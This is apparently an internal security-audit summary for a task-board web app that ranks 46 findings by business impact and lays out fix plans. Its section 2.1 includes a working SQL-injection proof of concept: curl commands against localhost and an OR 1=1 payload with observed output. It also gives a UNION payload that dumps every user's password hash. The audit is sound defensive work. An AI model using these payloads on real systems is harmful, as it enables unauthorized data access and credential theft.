# Combined Findings — Ranked by Business Impact

**Project:** taskboard
**Date:** 2026-05-13
**Inputs:** [SECURITY_FINDINGS.md](SECURITY_FINDINGS.md), [PERFORMANCE_FINDINGS.md](PERFORMANCE_FINDINGS.md), [DATA_INTEGRITY_FINDINGS.md](DATA_INTEGRITY_FINDINGS.md), [ARCHITECTURE_FINDINGS.md](ARCHITECTURE_FINDINGS.md), [TESTING_FINDINGS.md](TESTING_FINDINGS.md), [DEP_SECURITY_AUDIT.md](DEP_SECURITY_AUDIT.md), [SQL_INJECTION_AUDIT.md](SQL_INJECTION_AUDIT.md), [XSS_TOKEN_AUDIT.md](XSS_TOKEN_AUDIT.md), [IDOR_AND_HASH_LEAK_AUDIT.md](IDOR_AND_HASH_LEAK_AUDIT.md), [MASS_ASSIGNMENT_AUDIT.md](MASS_ASSIGNMENT_AUDIT.md).
**Goal:** a single ranking of every distinct issue by **business impact** (not by technical severity, not by engineering effort), so the team can decide what to fix first against a fixed budget.

---

## 1. How "business impact" is scored

Each finding is scored 1–5 against six business dimensions, summed for a total out of 30. Higher = bigger business hit if the issue is left unaddressed for ~6 months.

| Dim | Question | 5 means | 0 means |
|---|---|---|---|
| **Breach** | Does this expose customer data to outsiders? | Public DB-scale leak | No exposure |
| **ATO** | Can it lead to account takeover? | Mass / silent ATO | Cannot |
| **Compliance** | SOC2 / GDPR / contract-breach exposure | Material non-compliance | None |
| **Trust** | If a customer noticed, would they churn? | Public news event | Invisible |
| **Ops cost** | Cost of incident response + recovery | Multi-day all-hands | Trivial |
| **Velocity** | Does it slow every future change? | Every PR pays the tax | Zero |

A weighted *risk-adjusted* re-rank (likelihood × impact) sits at the bottom of §3 for cases where the gap between "possible" and "likely" matters.

---

## 2. Top-line — the items that matter most

If you fix only these, the live-exploitable, breach, ATO, regulatory, and disclosure paths that would dominate a real post-incident review are closed. Linked finding IDs match the source reports.

| Rank | Score /30 | Finding | Source | Why it ranks this high |
|---|---|---|---|---|
| 1 | **29** | **SQL injection in task search** → auth bypass + every `users.password_hash` exfilled via UNION | [SQL_INJECTION_AUDIT.md](SQL_INJECTION_AUDIT.md) | Already proven end-to-end. Bcrypt + seeded `password123` ⇒ trivial offline crack ⇒ legitimate logins ⇒ real tokens |
| 2 | **28** | **Dependency CVEs — Next.js prod surface (13 advisories incl. SSRF, proxy bypass, cache-poisoned redirects) + vitest dev-RCE** | [DEP_SECURITY_AUDIT.md](DEP_SECURITY_AUDIT.md) | Known-exploitable today. Chained: **(a)** SSRF (GHSA-c4j6) → cloud metadata → AWS/GCP creds → resource hijack / crypto-mining on org bill; **(b)** cache-poisoned middleware redirects (GHSA-3g8h, GHSA-wfc6) → every subsequent user fetches attacker-controlled content from the legitimate origin (effective domain takeover). Fix cost: 4 version pins inside stated majors |
| 3 | **28** | **`passwordHash` returned 18× by `GET /api/projects/:id`** (A2) | [IDOR_AND_HASH_LEAK_AUDIT.md](IDOR_AND_HASH_LEAK_AUDIT.md) | Every coworker reads every coworker's hash on routine page load. No exploit needed. Force-reset required once disclosed |
| 4 | **26** | **No rate limit on `/api/auth/login` + `bcryptjs` blocks the event loop** | [SECURITY_FINDINGS §4](SECURITY_FINDINGS.md) · [PERFORMANCE P4 / TH2](PERFORMANCE_FINDINGS.md) | 30 wrong-password attempts in 10 s, zero throttling, proven. `password123` falls instantly. Doubles as a CPU DoS at horizontal scale |
| 5 | **25** | **IDOR on `PATCH /api/tasks/:id`** (A1) — no caller-membership check | [IDOR_AND_HASH_LEAK_AUDIT.md](IDOR_AND_HASH_LEAK_AUDIT.md) | Any authenticated user, viewer or stranger, can rewrite any task. PoC ran across project boundaries; DB confirmed. Same root cause as B1 |
| 6 | **22** | **No audit log anywhere** | [DATA_INTEGRITY D16](DATA_INTEGRITY_FINDINGS.md) | Compounds every other finding: a successful exploit (we proved several) leaves zero trace. Blocks every B2B compliance conversation |
| 7 | **21** | **Cross-project assignee + user-existence oracle on `PATCH /api/tasks/:id`** (B1) | [MASS_ASSIGNMENT_AUDIT.md](MASS_ASSIGNMENT_AUDIT.md) | Trust corruption + PII enumeration (`{id, name, email}` returned for any valid userId). Couples with A1 to make `(any user, any task, any assignee)` legal |
| 8 | **20** | **No `@unique` on `users.email`** (TOCTOU race) + case-insensitive duplicates (D3 + D4) | [SECURITY_FINDINGS §3](SECURITY_FINDINGS.md) · [DATA_INTEGRITY D3-D4](DATA_INTEGRITY_FINDINGS.md) | Account squatting before legitimate signup; two coexisting accounts for one human. Schema-level miss |
| 9 | **20** | **No CSP / no security headers** + JWT in `localStorage` | [XSS_TOKEN_AUDIT.md §2](XSS_TOKEN_AUDIT.md) | XSS isn't reachable today, but **one** `dangerouslySetInnerHTML` or markdown integration ⇒ instant 30-day token theft (the JWT is reachable from any same-origin JS). No second line of defence |

### 2.1 Rank #1 in 30 seconds — live SQLi PoC

Concrete proof for the table's top row. Run against the seeded app on `http://localhost:3000`.

```bash
# 1. Log in as dev@example.com — VIEWER on "Q3 Launch" ONLY.
#    The user has zero access to "Customer Onboarding Revamp".
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"dev@example.com","password":"password123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

PID_Q3='cmp3q9s0d0006mh5rb2djov7a'    # dev IS a member (viewer)
PID_ONB='cmp3q9s0f000dmh5rk1ydxe3e'   # dev is NOT a member

# 2. Control: dev tries to list Onboarding tasks through the normal route.
curl -s -o /dev/null -w "normal route HTTP %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/projects/$PID_ONB/tasks"

# 3. Exploit: same user hits THEIR OWN project's search endpoint with a SQLi payload.
curl -s -G -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=%') OR 1=1 -- " \
  "http://localhost:3000/api/projects/$PID_Q3/tasks" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
by = {}
for t in d['tasks']:
    by.setdefault(t['project_id'], []).append(t['title'])
print(f'rows: {len(d[\"tasks\"])}, distinct projects: {len(by)}')
for pid, titles in by.items():
    print(f'  {pid} ({len(titles)} tasks)')
    for t in titles:
        print(f'    - {t}')
"
```

**Response — observed against the seeded DB:**

```
normal route HTTP 403          ← Onboarding correctly denied via the legitimate endpoint
{"error":"you are not a member of this project"}

rows: 12, distinct projects: 2
  cmp3q9s0d0006mh5rb2djov7a (7 tasks)            ← Q3 Launch (legit — dev IS a viewer)
    - Finalize launch date with marketing
    - Draft press release
    - Record demo video
    - Set up analytics dashboards
    - Prepare customer email blast
    - Update pricing page copy
    - QA the new signup flow end-to-end
  cmp3q9s0f000dmh5rk1ydxe3e (5 tasks)            ← Customer Onboarding (FORBIDDEN — 403'd above)
    - Map current onboarding funnel
    - Interview 5 recently-onboarded customers
    - Wireframe new welcome screens
    - Audit current onboarding emails
    - Define success metric (TTFV target)
```

**What this shows.** Same token, same user. Through the legitimate listing route → `HTTP 403`. Through the search endpoint with `q=%') OR 1=1 -- ` → `HTTP 200` and the response contains five tasks the user is explicitly forbidden from seeing. The membership check at the top of the handler is enforced at *entry*; it does not constrain the SQL that runs. Operator precedence (`AND` binds tighter than `OR`) plus the `--` line comment lifts the entire `WHERE` clause to always-true.

A more sinister variant of the same payload — `q=%') UNION SELECT id,email,name,password_hash,NULL::"TaskStatus",NULL,'',0,created_at,updated_at FROM users -- ` — slots the `users` table into the unioned result and returns **every user's bcrypt hash** through the same endpoint. Full PoC + observed output in [SQL_INJECTION_AUDIT.md §6.5](SQL_INJECTION_AUDIT.md).

**Fix (also one line of code change):** replace `prisma.$queryRawUnsafe(sql)` with a structured `prisma.task.findMany` — see [SQL_INJECTION_AUDIT.md §9.1](SQL_INJECTION_AUDIT.md).

---

## 3. Full ranked list (all findings, all reports)

Tiered by score band; sorted within tier by impact, then by effort.

### Tier S — Existential. Fix before anything else.

| Rank | Finding | Source | Impact dimensions | Effort | Already proven? |
|---|---|---|---|---|---|
| 1 | SQLi in task search (auth bypass + UNION → password hashes) | [SQL_INJECTION_AUDIT.md](SQL_INJECTION_AUDIT.md) | Breach 5 · ATO 5 · Compliance 5 · Trust 5 · Ops 5 · Velocity 4 | Low | ✓ live PoC |
| 2 | Dependency CVEs — Next.js prod surface (SSRF → IMDS → cloud-cred / crypto-mining; cache-poisoned middleware redirects; proxy bypass × 4) + vitest dev-RCE | [DEP_SECURITY_AUDIT.md](DEP_SECURITY_AUDIT.md) | Breach 5 · ATO 4 · Compliance 5 · Trust 5 · Ops 5 · Velocity 1 | Low (4 pins) | Patches public; exploit tooling exists for several GHSAs |
| 3 | `passwordHash` leak via `GET /api/projects/:id` (A2) | [IDOR_AND_HASH_LEAK_AUDIT.md](IDOR_AND_HASH_LEAK_AUDIT.md) | Breach 5 · ATO 5 · Compliance 5 · Trust 5 · Ops 5 · Velocity 3 | Low | ✓ live PoC |
| 4 | No rate limit on `/api/auth/login` (+ `bcryptjs` amplifies CPU DoS) | [SECURITY_FINDINGS §4](SECURITY_FINDINGS.md) | Breach 4 · ATO 5 · Compliance 4 · Trust 5 · Ops 5 · Velocity 3 | Low (Redis) | ✓ live PoC |
| 5 | IDOR on task PATCH — no caller-membership check (A1) | [IDOR_AND_HASH_LEAK_AUDIT.md](IDOR_AND_HASH_LEAK_AUDIT.md) | Breach 3 · ATO 4 · Compliance 5 · Trust 5 · Ops 5 · Velocity 3 | Low (3 lines) | ✓ live PoC |

### Tier A — Severe. Fix in the same sprint as Tier S.

| Rank | Finding | Source | Impact dimensions | Effort |
|---|---|---|---|---|
| 6 | No audit log on any mutation | [DATA_INTEGRITY D16](DATA_INTEGRITY_FINDINGS.md) | Compliance 5 · Ops 5 · Trust 4 · Velocity 4 · Breach 2 · ATO 1 | Med |
| 7 | Cross-project assignee + user-existence oracle (B1) | [MASS_ASSIGNMENT_AUDIT.md](MASS_ASSIGNMENT_AUDIT.md) | Compliance 4 · Trust 5 · Breach 3 · ATO 2 · Ops 4 · Velocity 3 | Low |
| 8 | No `@unique` on `users.email` (TOCTOU race) | [SECURITY_FINDINGS §3](SECURITY_FINDINGS.md) | ATO 5 · Compliance 4 · Trust 5 · Ops 4 · Breach 1 · Velocity 1 | Migration |
| 9 | Case-insensitive email duplicates (D4) | [DATA_INTEGRITY D4](DATA_INTEGRITY_FINDINGS.md) | ATO 4 · Trust 4 · Compliance 4 · Ops 4 · Breach 1 · Velocity 2 | Migration + Zod |
| 10 | No CSP / X-Frame / Referrer-Policy / HSTS | [XSS_TOKEN_AUDIT.md §2](XSS_TOKEN_AUDIT.md) | Breach 4 · ATO 4 · Trust 4 · Compliance 3 · Ops 3 · Velocity 1 | Low (headers) |
| 11 | No rate limit on `/api/auth/register` or anywhere else | [SECURITY_FINDINGS §4.3](SECURITY_FINDINGS.md) | ATO 3 · Trust 4 · Compliance 3 · Ops 4 · Breach 2 · Velocity 2 | Bundled w/ #4 |
| 12 | JWT in `localStorage` (any future XSS → instant 30-day theft) | [XSS_TOKEN_AUDIT.md §3](XSS_TOKEN_AUDIT.md) | ATO 5 · Breach 3 · Trust 5 · Compliance 3 · Ops 3 · Velocity 2 | Med (cookies) |

### Tier B — Significant. Resolve in the following sprint.

| Rank | Finding | Source | Impact dimensions | Effort |
|---|---|---|---|---|
| 13 | No optimistic concurrency on PATCH (silent lost updates) | [DATA_INTEGRITY D11](DATA_INTEGRITY_FINDINGS.md) | Trust 4 · Ops 4 · Compliance 3 · Velocity 2 · Breach 0 · ATO 0 | Med |
| 14 | `bcryptjs` (pure-JS) blocks event loop | [PERFORMANCE P4](PERFORMANCE_FINDINGS.md) | Ops 4 · Trust 4 · ATO 3 · Compliance 1 · Breach 1 · Velocity 1 | Trivial (drop-in) |
| 15 | JWT missing `aud` / `iss` / `nbf` claims | [SECURITY_FINDINGS §5](SECURITY_FINDINGS.md) | ATO 3 · Compliance 3 · Trust 3 · Breach 2 · Ops 2 · Velocity 2 | Low |
| 16 | Email enumeration via `/api/auth/register` response | [SECURITY_FINDINGS §6](SECURITY_FINDINGS.md) | ATO 3 · Compliance 3 · Trust 3 · Breach 2 · Ops 3 · Velocity 1 | Low |
| 17 | Project-detail over-fetch + duplicate user payloads (P2) | [PERFORMANCE P2](PERFORMANCE_FINDINGS.md) | Trust 3 · Ops 3 · Velocity 3 · Compliance 1 (A2 fix) · Breach 1 · ATO 0 | Low |
| 18 | No HTTP cache headers anywhere | [PERFORMANCE C1](PERFORMANCE_FINDINGS.md) | Trust 3 · Ops 3 · Velocity 2 · Compliance 0 · Breach 0 · ATO 0 | Low |
| 19 | `position` not unique within `(project, status)` — concurrent inserts race | [DATA_INTEGRITY D5](DATA_INTEGRITY_FINDINGS.md) | Trust 3 · Ops 3 · Velocity 2 · Compliance 2 · Breach 0 · ATO 0 | Low + migration |
| 20 | Missing indexes on `users.email`, `projects.ownerId`, `tasks.assigneeId`, `tasks.createdById` | [PERFORMANCE P3](PERFORMANCE_FINDINGS.md) | Trust 3 · Ops 3 · Velocity 2 · Breach 1 · ATO 1 · Compliance 1 | Migration |
| 21 | 3-step auth-then-data waterfall on every protected route (W1) | [PERFORMANCE W1](PERFORMANCE_FINDINGS.md) | Trust 3 · Ops 3 · Velocity 2 · Compliance 0 · Breach 0 · ATO 0 | Low |
| 22 | Task save → full project refetch invalidation cascade (P5/W10) | [PERFORMANCE P5/W10](PERFORMANCE_FINDINGS.md) | Trust 4 · Ops 2 · Velocity 1 · Compliance 0 · Breach 0 · ATO 0 | Med |

### Tier C — Moderate. Background work / next quarter.

| Rank | Finding | Source | Impact dimensions | Effort |
|---|---|---|---|---|
| 23 | N+1 over-fetch in dashboard `taskCount` (P1) | [PERFORMANCE P1](PERFORMANCE_FINDINGS.md) | Trust 2 · Ops 2 · Velocity 1 | Trivial |
| 24 | No domain / application / infrastructure boundaries | [ARCHITECTURE_FINDINGS.md](ARCHITECTURE_FINDINGS.md) | Velocity 5 · Ops 3 · Compliance 2 · Trust 1 · Breach 1 · ATO 1 | High (10-step) |
| 25 | Test suite covers ~10 cases; zero API/integration/E2E/security regression tests | [TESTING_FINDINGS.md](TESTING_FINDINGS.md) | Velocity 4 · Ops 3 · Compliance 3 · Trust 2 · Breach 2 · ATO 2 | Med–High |
| 26 | `updatedAt` bumps on no-op PATCH (D10) | [DATA_INTEGRITY D10](DATA_INTEGRITY_FINDINGS.md) | Trust 2 · Ops 2 · Velocity 1 · Compliance 1 · Breach 0 · ATO 0 | Trivial |
| 27 | No server-side cache / no Redis / no singleflight (C2 + TH5) | [PERFORMANCE C2 / TH5](PERFORMANCE_FINDINGS.md) | Ops 3 · Trust 2 · Velocity 2 · Compliance 0 · Breach 0 · ATO 0 | Med |
| 28 | TanStack `staleTime` global; no jitter (C4) | [PERFORMANCE C4](PERFORMANCE_FINDINGS.md) | Ops 2 · Trust 2 · Velocity 1 | Trivial |
| 29 | No pagination on any list endpoint (P8) | [PERFORMANCE P8](PERFORMANCE_FINDINGS.md) | Ops 2 · Trust 2 · Velocity 2 | Low–Med |
| 30 | Trim / tristate normalisation gaps (D12, D13, D14, D15) | [DATA_INTEGRITY D12-D15](DATA_INTEGRITY_FINDINGS.md) | Trust 2 · Compliance 1 · Ops 1 · Velocity 1 | Trivial |
| 31 | `getCurrentUser` DB hit on every request (W7) | [PERFORMANCE W7](PERFORMANCE_FINDINGS.md) | Ops 3 · Trust 2 · Velocity 1 | Low (cache) |
| 32 | Per-route waterfalls W2 / W3 / W4 / W5 | [PERFORMANCE W2-W5](PERFORMANCE_FINDINGS.md) | Ops 2 · Trust 2 · Velocity 1 | Low |
| 33 | Login → dashboard cold start, no `me` pre-population (W8/W11) | [PERFORMANCE W8 / W11](PERFORMANCE_FINDINGS.md) | Trust 2 · Velocity 1 | Low |
| 34 | No hover-prefetch on project cards (W9) | [PERFORMANCE W9](PERFORMANCE_FINDINGS.md) | Trust 2 · Velocity 1 | Trivial |

### Tier D — Latent / low-impact / future scaling

| Rank | Finding | Source | Why low for now |
|---|---|---|---|
| 35 | Status FSM not enforced (D19) | [DATA_INTEGRITY D19](DATA_INTEGRITY_FINDINGS.md) | Possibly intended — no current product harm |
| 36 | Position unbounded above (D15) | [DATA_INTEGRITY D15](DATA_INTEGRITY_FINDINGS.md) | Bound by D5 fix |
| 37 | Membership delete leaves orphan assignees (D6) | [DATA_INTEGRITY D6](DATA_INTEGRITY_FINDINGS.md) | No "remove member" endpoint today |
| 38 | Owner-vs-membership split-brain risk (D7/D8) | [DATA_INTEGRITY D7-D8](DATA_INTEGRITY_FINDINGS.md) | No role-management endpoint today |
| 39 | Airtable consistency model (D18) | [DATA_INTEGRITY D18](DATA_INTEGRITY_FINDINGS.md) | Real integration not yet shipped |
| 40 | Default Prisma connection pool (P11) | [PERFORMANCE P11](PERFORMANCE_FINDINGS.md) | Single-vCPU containers only |
| 41 | Dockerfile uses `npm install` not `npm ci` (P12) | [PERFORMANCE P12](PERFORMANCE_FINDINGS.md) | Build hygiene only |
| 42 | Compression / Brotli not verified (P14) | [PERFORMANCE P14](PERFORMANCE_FINDINGS.md) | Default-on in Next.js |
| 43 | No `React.memo` on `TaskCard` (P16) | [PERFORMANCE P16](PERFORMANCE_FINDINGS.md) | 200+ task boards only |
| 44 | `airtable` accidentally bundled in client component (P17) | [PERFORMANCE P17](PERFORMANCE_FINDINGS.md) | Lint guard; not triggered yet |
| 45 | TanStack persistence to disk (C5) | [PERFORMANCE C5](PERFORMANCE_FINDINGS.md) | Optional UX nicety |
| 46 | Turbopack only in dev (P13) | [PERFORMANCE P13](PERFORMANCE_FINDINGS.md) | Build-time only |

---

## 4. Risk-adjusted top of the list (likelihood × impact)

Some Tier-A findings are *latent* (need a future feature to trip) while some Tier-B findings are *actively exploitable today*. This re-rank weights by likelihood-now:

| # | Finding | Score | Why this moves |
|---|---|---|---|
| 1 | SQLi in task search | 29 × 1.0 = **29** | Confirmed live, exploit takes seconds |
| 2 | Dependency CVEs (Next.js prod + vitest) | 28 × 1.0 = **28** | Public attack tooling exists for several GHSAs; SSRF → cloud-metadata → crypto-mining chain is the most common cause of unexplained cloud-bill spikes; cache-poisoned redirects effectively hijack the origin's content |
| 3 | passwordHash leak (A2) | 28 × 1.0 = **28** | Triggered by routine page load — every page view in production is a "miss" |
| 4 | Login rate-limit absent | 26 × 1.0 = **26** | bcrypt-cost makes the password brute-force window tractable today |
| 5 | IDOR on task PATCH (A1) | 25 × 1.0 = **25** | Every authenticated user is a candidate attacker |
| 6 | Cross-project assignee + oracle (B1) | 21 × 0.9 = **18.9** | Live, but quieter — requires intent |
| 7 | No CSP / security headers | 20 × 0.9 = **18.0** | Latent today (no XSS sink), trips on first regression |
| 8 | No audit log | 22 × 0.8 = **17.6** | Compliance issue manifests at sale time, not breach time |
| 9 | `@unique` on email + case-insensitive | 20 × 0.8 = **16.0** | Needs a malicious-or-confused signup pattern to actually hit |
| 10 | Email enumeration via register | 12 × 1.0 = **12.0** | Trivial to run but lower direct damage |

The first five remain stable under any reasonable weighting; the rest reshuffle slightly.

---

## 5. "If you fix only X things"

A budget-by-budget action plan.

### If you fix only 3 things (~½ day of work)
1. **Pin `next@15.5.18 vitest@2.1.9 tsx@4.21.0 eslint@9.39.4`** ([DEP_SECURITY_AUDIT](DEP_SECURITY_AUDIT.md) §Action).
2. **Replace `$queryRawUnsafe` with `prisma.task.findMany`** ([SQL_INJECTION_AUDIT §9.1](SQL_INJECTION_AUDIT.md)).
3. **Add `select: { id, email, name }` to the project-detail joins** ([IDOR_AND_HASH_LEAK_AUDIT §2.5](IDOR_AND_HASH_LEAK_AUDIT.md)).

This shuts the live data-breach paths.

### If you fix only 6 things (~1 day)
Add to the above:

4. **Force-reset all user passwords**, because hashes have been observable through #2 (project-detail leak) and #3 (SQLi UNION exfil).
5. **Apply the combined A1+B1 fix to `PATCH /api/tasks/:id`** ([MASS_ASSIGNMENT_AUDIT §8.1](MASS_ASSIGNMENT_AUDIT.md)).
6. **Add rate limiting on `/api/auth/login`** (`@upstash/ratelimit` if you have Redis; otherwise an in-memory limiter as a stopgap).

This shuts the live ATO paths.

### If you fix only 10 things (~½ sprint)
Add:

7. **Add `@unique` on `users.email`** + Zod `.trim().toLowerCase()` + DB index on `lower(email)` ([DATA_INTEGRITY D3/D4](DATA_INTEGRITY_FINDINGS.md)).
8. **Add `aud` / `iss` claims and `algorithms: ["HS256"]`** ([SECURITY_FINDINGS §5](SECURITY_FINDINGS.md)).
9. **Add CSP, X-Frame-Options, Referrer-Policy, X-Content-Type-Options, HSTS** ([XSS_TOKEN_AUDIT §7.1](XSS_TOKEN_AUDIT.md)).
10. **Add an `AuditLog` table and instrument PATCH/DELETE writes** ([DATA_INTEGRITY D16](DATA_INTEGRITY_FINDINGS.md)).

This brings the app to a defensible posture for a B2B / SOC2 conversation.

### If you fix 20 things (~1 sprint)
Add the rest of Tier B: optimistic concurrency on PATCH, `bcryptjs → bcrypt`, email-enumeration mitigation, project-detail over-fetch fix, HTTP cache headers, `position` uniqueness, the four missing indexes, and the W1 auth-merge.

This eliminates every actively-exploitable finding *and* makes the app horizontally scalable.

---

## 6. Findings that share a root cause (fix once, two/three problems gone)

Some items in the table collapse to a single change:

| Single change | Closes |
|---|---|
| `email @unique` + Zod normalise + `lower(email)` index | #9 (race), #10 (case-insensitive dup), part of #21 (login seq scan) |
| Explicit `select` on every User join in project detail | #2 (passwordHash leak), #18 (over-fetch) |
| `PATCH /api/tasks/:id` membership + assignee-membership + try/catch | #5 (A1 IDOR), #8 (B1 cross-project + oracle), part of #22 (W4 waterfall) |
| Replace `findFirst + create` with `create + P2002 catch` in register | #9 (race), #17 (enumeration if combined with constant-response), part of #22 |
| Introduce middleware ([ARCHITECTURE_FINDINGS §4.4](ARCHITECTURE_FINDINGS.md)) | #4 (login rate limit), #11 (security headers), #6 (audit log home), part of every "no cross-cutting concern" finding |
| Move to use-case layer + repository ports | Long-tail of #25 (arch), #26 (testing), and every future regression of #2 / #5 / #8 by construction |

---

## 7. What this codebase does well (so improvements compound)

For balance, none of the following needs fixing — they are correct foundations:

- Composite index `(projectId, status)` on `Task` ([prisma/schema.prisma:85](../prisma/schema.prisma#L85)) — the Kanban board's hot path.
- Cascade-delete from Project → Tasks, Memberships ([prisma/schema.prisma:81](../prisma/schema.prisma#L81)).
- `Restrict` on `Project.owner` and `Task.createdBy` — no accidental user-delete corruption.
- Singleton Prisma client ([src/lib/prisma.ts](../src/lib/prisma.ts)) — avoids the connection-explosion antipattern.
- Zod validation on every mutating route — input shape is sound.
- `getCurrentUser` already uses an explicit `select` ([src/lib/auth.ts:21](../src/lib/auth.ts#L21)) — the right pattern is in the codebase, just not applied everywhere.
- TanStack Query with reasonable defaults (`staleTime: 30s`, `refetchOnWindowFocus: false`).
- Testing harness choices (Vitest 2, Testing Library, `@/` alias) are correct — what's missing is *coverage*, not infra.

Once Tier S + A is done, this is a small, internally-consistent codebase with a clear path through Tier B–D.

---

## 8. Cross-references

- [SECURITY_FINDINGS.md](SECURITY_FINDINGS.md) · [PERFORMANCE_FINDINGS.md](PERFORMANCE_FINDINGS.md) · [DATA_INTEGRITY_FINDINGS.md](DATA_INTEGRITY_FINDINGS.md) · [ARCHITECTURE_FINDINGS.md](ARCHITECTURE_FINDINGS.md) · [TESTING_FINDINGS.md](TESTING_FINDINGS.md) — the five consolidated findings reports.
- [DEP_SECURITY_AUDIT.md](DEP_SECURITY_AUDIT.md) · [SQL_INJECTION_AUDIT.md](SQL_INJECTION_AUDIT.md) · [XSS_TOKEN_AUDIT.md](XSS_TOKEN_AUDIT.md) · [IDOR_AND_HASH_LEAK_AUDIT.md](IDOR_AND_HASH_LEAK_AUDIT.md) · [MASS_ASSIGNMENT_AUDIT.md](MASS_ASSIGNMENT_AUDIT.md) — the five PoC reports cited in the rankings above.
